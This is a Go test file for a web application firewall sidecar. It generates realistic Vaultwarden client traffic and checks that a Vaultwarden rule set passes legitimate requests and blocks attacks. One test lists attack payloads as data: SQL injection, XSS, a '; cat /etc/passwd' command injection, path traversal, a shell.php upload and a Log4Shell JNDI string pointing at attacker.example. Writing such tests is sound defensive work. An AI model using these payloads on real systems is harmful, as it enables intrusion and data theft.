package services

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"math/rand/v2"
	"mime/multipart"
	"net"
	"net/http"
	"net/url"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/rforced/ostiole/internal/model"
	"github.com/rforced/ostiole/internal/wafevent"
)

// vw makes what Vaultwarden's clients send, from a seed, so a failure
// comes back the same every run: type 2 ciphertext, UUIDs, .NET's dates,
// tokens signed as Vaultwarden signs them.
type vw struct{ r *rand.Rand }

func (g vw) bytes(n int) []byte {
	b := make([]byte, n)
	for i := range b {
		b[i] = byte(g.r.UintN(256))
	}
	return b
}

// enc is n bytes encrypted: iv|data|mac, the data padded to 16.
func (g vw) enc(n int) string {
	return "2." + base64.StdEncoding.EncodeToString(g.bytes(16)) + "|" +
		base64.StdEncoding.EncodeToString(g.bytes((n/16+1)*16)) + "|" + base64.StdEncoding.EncodeToString(g.bytes(32))
}

func (g vw) uuid() string {
	b := g.bytes(16)
	b[6], b[8] = b[6]&0x0f|0x40, b[8]&0x3f|0x80
	return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:16])
}

func (g vw) date() string {
	t := time.Date(2020+g.r.IntN(7), time.Month(1+g.r.IntN(12)), 1+g.r.IntN(28), g.r.IntN(24), g.r.IntN(60), g.r.IntN(60), g.r.IntN(1e9), time.UTC)
	return t.Format([]string{"2006-01-02T15:04:05.000Z", "2006-01-02T15:04:05.000000Z", "2006-01-02T15:04:05.0000000Z"}[g.r.IntN(3)])
}

func (g vw) pick(list ...string) string { return list[g.r.IntN(len(list))] }

// word is n letters and digits, as an API key's secret is.
func (g vw) word(n int) string {
	const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = chars[g.r.IntN(len(chars))]
	}
	return string(b)
}

func (g vw) email() string {
	return g.pick("alice", "j.doe", "jane_doe", "sam+vault", "a1") + "@" + g.pick("example.com", "mail.example.org", "example.net")
}

// hash is a master password hash, or a Send's password.
func (g vw) hash() string { return base64.StdEncoding.EncodeToString(g.bytes(32)) }

func (g vw) jwt() string {
	now := 1759000000 + g.r.IntN(1e6)
	claims := fmt.Sprintf(`{"nbf":%d,"exp":%d,"iss":"https://vault.example.com|login","sub":"%s","premium":true,"name":"Alice",`+
		`"email":"%s","email_verified":true,"sstamp":"%s","device":"%s","scope":["api","offline_access"],"amr":["Application"]}`,
		now, now+7200, g.uuid(), g.email(), g.uuid(), g.uuid())
	return base64.RawURLEncoding.EncodeToString([]byte(`{"typ":"JWT","alg":"RS256"}`)) + "." +
		base64.RawURLEncoding.EncodeToString([]byte(claims)) + "." + base64.RawURLEncoding.EncodeToString(g.bytes(256))
}

func (g vw) cipher() map[string]any {
	m := map[string]any{
		"folderId": nil, "organizationId": nil, "name": g.enc(4 + g.r.IntN(40)), "notes": g.enc(g.r.IntN(3000)),
		"favorite": g.r.IntN(2) == 0, "lastKnownRevisionDate": g.date(), "reprompt": g.r.IntN(2), "key": g.enc(64),
		"fields":          []any{map[string]any{"type": g.r.IntN(4), "name": g.enc(10), "value": g.enc(30), "linkedId": nil}},
		"passwordHistory": []any{map[string]any{"password": g.enc(20), "lastUsedDate": g.date()}},
	}
	if g.r.IntN(2) == 0 {
		m["folderId"] = g.uuid()
	}
	if g.r.IntN(3) == 0 {
		m["attachments2"] = map[string]any{fmt.Sprintf("%x", g.bytes(10)): map[string]any{"fileName": g.enc(20), "key": g.enc(64)}}
	}
	switch g.r.IntN(5) {
	case 0:
		m["type"], m["login"] = 1, map[string]any{
			"uris":     []any{map[string]any{"uri": g.enc(40), "match": nil, "uriChecksum": g.enc(44)}},
			"username": g.enc(20), "password": g.enc(30), "passwordRevisionDate": g.date(), "totp": g.enc(32),
			"fido2Credentials": []any{map[string]any{"credentialId": g.enc(36), "keyType": g.enc(10), "keyAlgorithm": g.enc(5),
				"keyCurve": g.enc(5), "keyValue": g.enc(150), "rpId": g.enc(15), "rpName": g.enc(10), "userHandle": g.enc(64),
				"userName": g.enc(20), "userDisplayName": g.enc(20), "counter": g.enc(2), "discoverable": g.enc(5), "creationDate": g.date()}},
		}
	case 1:
		m["type"], m["secureNote"] = 2, map[string]any{"type": 0}
	case 2:
		m["type"], m["card"] = 3, map[string]any{"cardholderName": g.enc(20), "brand": g.enc(6), "number": g.enc(16),
			"expMonth": g.enc(2), "expYear": g.enc(4), "code": g.enc(3)}
	case 3:
		id := map[string]any{}
		for _, f := range []string{"title", "firstName", "lastName", "address1", "city", "postalCode", "email", "phone", "ssn", "username"} {
			id[f] = g.enc(12)
		}
		m["type"], m["identity"] = 4, id
	default:
		m["type"], m["sshKey"] = 5, map[string]any{"privateKey": g.enc(400), "publicKey": g.enc(90), "keyFingerprint": g.enc(50)}
	}
	return m
}

func (g vw) send() map[string]any {
	return map[string]any{"type": 0, "name": g.enc(20), "notes": nil, "key": g.enc(64),
		"text": map[string]any{"text": g.enc(10 + g.r.IntN(1000)), "hidden": false}, "maxAccessCount": nil,
		"expirationDate": g.date(), "deletionDate": g.date(), "disabled": false, "hideEmail": false, "password": g.hash()}
}

// vwRequest is one request of a client's, and upload names a file part.
type vwRequest struct {
	method, path, contentType, body, upload string
}

func vwJSON(v any) string {
	raw, err := json.Marshal(v)
	if err != nil {
		panic(err)
	}
	return string(raw)
}

func vwForm(pairs ...string) string {
	v := url.Values{}
	for i := 0; i < len(pairs); i += 2 {
		v.Set(pairs[i], pairs[i+1])
	}
	return v.Encode()
}

// requests is one of everything the clients were seen to send.
func (g vw) requests() []vwRequest {
	const js = "application/json; charset=utf-8"
	const form = "application/x-www-form-urlencoded; charset=utf-8"
	item := "/api/ciphers/" + g.uuid()
	return []vwRequest{
		{"GET", "/api/sync?excludeDomains=true", "", "", ""},
		{"POST", "/api/ciphers", js, vwJSON(g.cipher()), ""},
		{"PUT", item, js, vwJSON(g.cipher()), ""},
		{"PUT", item + "/partial", js, vwJSON(map[string]any{"folderId": g.uuid(), "favorite": true}), ""},
		{"PUT", "/api/ciphers/move", js, vwJSON(map[string]any{"ids": []string{g.uuid(), g.uuid()}, "folderId": g.uuid()}), ""},
		{"PUT", item + "/delete", "", "", ""},
		{"PUT", item + "/restore", "", "", ""},
		{"DELETE", item, "", "", ""},
		{"PUT", "/api/ciphers/delete", js, vwJSON(map[string]any{"ids": []string{g.uuid(), g.uuid()}}), ""},
		{"PUT", "/api/ciphers/restore", js, vwJSON(map[string]any{"ids": []string{g.uuid()}}), ""},
		{"DELETE", "/api/ciphers", js, vwJSON(map[string]any{"ids": []string{g.uuid(), g.uuid()}}), ""},
		{"POST", item + "/attachment/v2", js, vwJSON(map[string]any{"key": g.enc(64), "fileName": g.enc(20), "fileSize": 1 + g.r.IntN(1e6), "adminRequest": false}), ""},
		{"POST", item + "/attachment/" + fmt.Sprintf("%x", g.bytes(10)), "", "", g.enc(20)},
		{"POST", "/api/folders", js, vwJSON(map[string]any{"name": g.enc(12)}), ""},
		{"PUT", "/api/folders/" + g.uuid(), js, vwJSON(map[string]any{"name": g.enc(12)}), ""},
		{"DELETE", "/api/folders/" + g.uuid(), "", "", ""},
		{"POST", "/api/sends", js, vwJSON(g.send()), ""},
		{"PUT", "/api/sends/" + g.uuid(), js, vwJSON(g.send()), ""},
		{"DELETE", "/api/sends/" + g.uuid(), "", "", ""},
		{"POST", "/api/sends/access/" + base64.RawURLEncoding.EncodeToString(g.bytes(16)), js, vwJSON(map[string]any{"password": g.hash()}), ""},
		{"PUT", "/api/accounts/profile", js, vwJSON(map[string]any{"name": g.pick("Alice Doe", "Jane O'Hara", "Sam"), "culture": "en-US",
			"masterPasswordHint": g.pick("the usual", "", "blue car + 42")}), ""},
		{"POST", "/identity/accounts/prelogin", js, vwJSON(map[string]any{"email": g.email()}), ""},
		{"POST", "/identity/accounts/prelogin/password", js, vwJSON(map[string]any{"email": g.email()}), ""},
		{"POST", "/identity/connect/token", form, vwForm("scope", "api offline_access", "client_id", g.pick("web", "browser", "mobile"),
			"deviceType", "10", "deviceIdentifier", g.uuid(), "deviceName", g.pick("firefox", "chrome", "Pixel 8 Pro", "iPhone"),
			"grant_type", "password", "username", g.email(), "password", g.hash(),
			"twoFactorToken", fmt.Sprintf("%06d", g.r.IntN(1e6)), "twoFactorProvider", "0", "twoFactorRemember", "1"), ""},
		{"POST", "/identity/connect/token", form, vwForm("grant_type", "refresh_token", "client_id", "web",
			"refresh_token", base64.RawURLEncoding.EncodeToString(g.bytes(64))), ""},
		{"POST", "/identity/connect/token", form, vwForm("grant_type", "client_credentials", "scope", "api", "client_id", "user."+g.uuid(),
			"client_secret", g.word(30), "deviceType", "14", "deviceIdentifier", g.uuid(), "deviceName", "cli"), ""},
		{"GET", "/notifications/hub?access_token=" + g.jwt(), "", "", ""},
		{"GET", "/attachments/" + g.uuid() + "/" + fmt.Sprintf("%x", g.bytes(10)) + "?token=" + g.jwt(), "", "", ""},
	}
}

// vwSend sends r to the vault site at addr and returns the status.
func vwSend(t *testing.T, addr string, r vwRequest) int {
	t.Helper()
	body, contentType := r.body, r.contentType
	if r.upload != "" {
		var b strings.Builder
		w := multipart.NewWriter(&b)
		part, err := w.CreateFormFile("data", r.upload)
		if err != nil {
			t.Fatal(err)
		}
		_, _ = part.Write([]byte("ciphertext of the file"))
		_ = w.Close()
		body, contentType = b.String(), w.FormDataContentType()
	}
	tr := &http.Transport{DialContext: func(ctx context.Context, network, _ string) (net.Conn, error) {
		var d net.Dialer
		return d.DialContext(ctx, network, addr)
	}}
	defer tr.CloseIdleConnections()
	req, err := http.NewRequestWithContext(t.Context(), r.method, "http://vault.example.com"+r.path, strings.NewReader(body))
	if err != nil {
		t.Fatal(err)
	}
	if contentType != "" {
		req.Header.Set("Content-Type", contentType)
	}
	req.Header.Set("Accept", "application/json")
	req.Header.Set("Bitwarden-Client-Name", "web")
	req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0")
	resp, err := (&http.Client{Transport: tr, Timeout: time.Minute}).Do(req)
	if err != nil {
		t.Fatalf("%s %s: %v", r.method, r.path, err)
	}
	_ = resp.Body.Close()
	return resp.StatusCode
}

// vaultSite runs the sidecar with one Vaultwarden site at paranoia pl,
// blocking, with the set loaded or not.
func vaultSite(t *testing.T, pl int, set bool) (string, *lockedBuffer) {
	t.Helper()
	profile := model.WAFProfile{ID: "vault", Mode: "block", Paranoia: pl}
	if set {
		profile.Applications = []string{"vaultwarden"}
	}
	cfg := &model.Config{}
	cfg.Services.Proxy = model.Proxy{
		Enabled: true, HTTPPort: freePort(t), HTTPSPort: freePort(t),
		Pools:    []model.ProxyPool{{ID: "vw", Upstreams: []model.ProxyUpstream{{Address: answer(t, "{}")}}}},
		Profiles: []model.WAFProfile{profile},
		Sites: []model.ProxySite{{ID: "vault", Enabled: true, Hosts: []string{"vault.example.com"}, Pool: "vw",
			PlainHTTP: true, WAF: "vault"}},
	}
	plain, _, out := runSidecar(t, sidecar(t), cfg, "", map[string][]string{model.SelfCertificate: {"127.0.0.1"}})
	return plain, out
}

// events is what the WAF wrote, a line an event.
func events(out *lockedBuffer) string {
	var b strings.Builder
	for line := range strings.SplitSeq(out.String(), "\n") {
		if ev, ok := wafevent.Parse(line); ok {
			fmt.Fprintf(&b, "%s %s:", ev.Method, ev.URI)
			for _, h := range ev.Rules {
				fmt.Fprintf(&b, " %d", h.ID)
			}
			b.WriteString("\n")
		}
	}
	return b.String()
}

// What Vaultwarden's clients send passes at every paranoia level with the
// set loaded, where at paranoia 4 without it every save is refused.
func TestTheVaultwardenSetLetsItsClientsThrough(t *testing.T) {
	t.Parallel()
	for pl := 1; pl <= 4; pl++ {
		t.Run(fmt.Sprintf("paranoia %d", pl), func(t *testing.T) {
			t.Parallel()
			plain, out := vaultSite(t, pl, true)
			g := vw{rand.New(rand.NewPCG(uint64(pl), 1))}
			for range 8 {
				for _, r := range g.requests() {
					if status := vwSend(t, plain, r); status != http.StatusOK {
						t.Errorf("%s %s: %d", r.method, r.path, status)
					}
				}
			}
			if t.Failed() {
				t.Logf("events:\n%s", events(out))
			}
		})
	}
}

// An attack is refused with the set loaded at every level, whether it is
// typed where ciphertext belongs, sits among ciphertext that would
// otherwise pass, or comes in a token, a sign-in or a file's name.
func TestTheVaultwardenSetKeepsTheAttacks(t *testing.T) {
	t.Parallel()
	g := vw{rand.New(rand.NewPCG(7, 7))}
	const js = "application/json"
	item := func(field, value string) string {
		c := g.cipher()
		c[field] = value
		return vwJSON(c)
	}
	attacks := []vwRequest{
		{"PUT", "/api/ciphers/" + g.uuid(), js, item("name", "x' OR '1'='1' UNION SELECT password FROM users--"), ""},
		{"POST", "/api/ciphers", js, item("notes", "<script>alert(document.cookie)</script>"), ""},
		{"PUT", "/api/folders/" + g.uuid(), js, vwJSON(map[string]any{"name": "; cat /etc/passwd"}), ""},
		{"POST", "/api/sends", js, vwJSON(map[string]any{"type": 0, "name": g.enc(10), "key": g.enc(64),
			"text": map[string]any{"text": "${jndi:ldap://attacker.example/a}"}}), ""},
		{"POST", "/api/sends/access/abc", js, vwJSON(map[string]any{"password": "' OR 1=1--"}), ""},
		{"POST", "/identity/accounts/prelogin", js, vwJSON(map[string]any{"email": "a@b.c' UNION SELECT 1,2--"}), ""},
		{"POST", "/identity/connect/token", "application/x-www-form-urlencoded",
			vwForm("grant_type", "password", "client_id", "web", "username", "admin'--", "password", g.hash(),
				"scope", "api offline_access", "deviceIdentifier", g.uuid()), ""},
		{"POST", "/identity/connect/token", "application/x-www-form-urlencoded",
			vwForm("grant_type", "refresh_token", "client_id", "web", "refresh_token", "<svg onload=alert(1)>"), ""},
		{"GET", "/notifications/hub?access_token=../../../../etc/passwd", "", "", ""},
		{"POST", "/api/ciphers/" + g.uuid() + "/attachment/abc", "", "", "shell.php"},
		// Outside the paths the set covers, ciphertext is read as CRS reads it.
		{"POST", "/admin/users", js, vwJSON(map[string]any{"name": "<script>alert(1)</script>", "key": g.enc(64)}), ""},
	}
	for pl := 1; pl <= 4; pl++ {
		t.Run(fmt.Sprintf("paranoia %d", pl), func(t *testing.T) {
			t.Parallel()
			plain, out := vaultSite(t, pl, true)
			for _, r := range attacks {
				if status := vwSend(t, plain, r); status != http.StatusForbidden {
					t.Errorf("%s %s with %.60q: %d", r.method, r.path, r.body+r.upload, status)
				}
			}
			if t.Failed() {
				t.Logf("events:\n%s", events(out))
			}
		})
	}
}

// An import or a key rotation sends the whole vault at once, more
// arguments than the thousand the WAF reads, and passes at every level with
// the set loaded. That many anywhere else, or without the set, is refused
// by the WAF's own rule for a body past the limit, 10007.
func TestTheVaultwardenSetLetsAWholeVaultThrough(t *testing.T) {
	t.Parallel()
	g := vw{rand.New(rand.NewPCG(9, 9))}
	const js = "application/json; charset=utf-8"
	var ciphers []any
	for range 60 {
		ciphers = append(ciphers, g.cipher())
	}
	name := g.enc(12)
	vault := vwJSON(map[string]any{"ciphers": ciphers, "folders": []any{map[string]any{"name": name}},
		"folderRelationships": []any{map[string]any{"key": 0, "value": 0}}})
	org := vwJSON(map[string]any{"ciphers": ciphers, "collections": []any{map[string]any{"name": name}},
		"collectionRelationships": []any{map[string]any{"key": 0, "value": 0}}})
	// Key rotation's own fields are not covered yet, so numbers stand in.
	numbers := make([]int, 1100)
	for i := range numbers {
		numbers[i] = i
	}
	many := vwJSON(map[string]any{"accountData": map[string]any{"ciphers": numbers}})
	whole := []vwRequest{
		{"POST", "/api/ciphers/import", js, vault, ""},
		{"POST", "/api/ciphers/import-organization?organizationId=" + g.uuid(), js, org, ""},
		{"POST", "/api/accounts/key-management/rotate-user-account-keys", js, many, ""},
	}
	for pl := 1; pl <= 4; pl++ {
		t.Run(fmt.Sprintf("paranoia %d", pl), func(t *testing.T) {
			t.Parallel()
			plain, out := vaultSite(t, pl, true)
			for _, r := range whole {
				if status := vwSend(t, plain, r); status != http.StatusOK {
					t.Errorf("%s %s: %d", r.method, r.path, status)
				}
			}
			if t.Failed() {
				t.Logf("events:\n%s", events(out))
			}
		})
	}
	refused := func(t *testing.T, set bool, r vwRequest) {
		t.Helper()
		plain, out := vaultSite(t, 1, set)
		if status := vwSend(t, plain, r); status != http.StatusForbidden {
			t.Errorf("%s %s: %d", r.method, r.path, status)
		}
		waitFor(t, "the refusal", func() bool {
			_, ok := findEvent(out, func(ev wafevent.Event) bool {
				return slices.ContainsFunc(ev.Rules, func(h wafevent.Hit) bool { return h.ID == 10007 })
			})
			return ok
		})
	}
	folder := "/api/folders/" + g.uuid()
	t.Run("elsewhere", func(t *testing.T) {
		t.Parallel()
		refused(t, true, vwRequest{"PUT", folder, js, many, ""})
	})
	t.Run("without the set", func(t *testing.T) {
		t.Parallel()
		refused(t, false, whole[0])
	})
}
